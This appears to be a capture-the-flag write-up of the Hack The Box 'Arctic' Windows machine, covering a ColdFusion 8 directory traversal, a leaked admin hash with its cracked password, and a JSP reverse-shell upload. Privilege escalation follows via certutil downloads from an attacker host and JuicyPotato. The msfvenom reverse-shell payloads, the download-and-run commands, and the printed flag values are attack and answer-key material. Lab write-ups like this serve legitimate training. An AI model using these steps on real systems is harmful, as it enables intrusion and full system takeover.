# Arctic

Address: `10.10.10.11`

## Recon

- platform is windows
- 135 msrpc
- 8500 fmtp?
- 49154 rpc

When visiting the port `8500`, we actually get a directory with files listed.

Navigating to `http://10.10.10.11:8500/CFIDE/administrator/` yields us with a coldfusion 8 server.

## Coldfusion 8

The server is running coldfusion8. A known vulnerability on coldFusion 8 is directory traversal on [exploitdb](https://www.exploit-db.com/exploits/14641)

Then we get the hashes the password:

```sh
Username: admin
Password: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 = happyday
```

logging into the control panel, it is possible to upload a file in scheduled tasks since there is an RFI vulnerability there.

Using a python script found online for the file upload:

Create the payload:

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=443 > shell.jsp
```

then run the arbitrary file upload script

```sh
python coldfusion_afi.py 10.10.10.11 8500 /home/omar2535/HTB/results/10.10.10.11/exploit/shell.jsp
```

And now with a netcat listener on 443, we get a reverse shell

User.txt: `02650d3a69a70780c302e146a6cb96f3`

## Priv esc

```sh
certutil.exe -urlcache -split -f "http://10.10.14.27/winPEAS.bat" C:\Users\tolis\Desktop\winPEAS.bat
```

Find that juicy potato exploit is available

Generate shell for it

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.27 LPORT=5555 -f exe > shell.exe
```

Transfer required files over

```sh
certutil.exe -urlcache -split -f "http://10.10.14.27/JuicyPotato.exe" C:\Users\tolis\Desktop\JuicyPotato.exe
```

```sh
certutil.exe -urlcache -split -f "http://10.10.14.27/shell.exe" C:\Users\tolis\Desktop\shell.exe
```

Fire it off with a netcat listener on `5555`:

```sh
JuicyPotato.exe -t t -p C:\Users\tolis\Desktop\shell.exe -l 5837
```

And root is obtained.

Root.txt: `ce65ceee66b2b5ebaff07e50508ffb90`
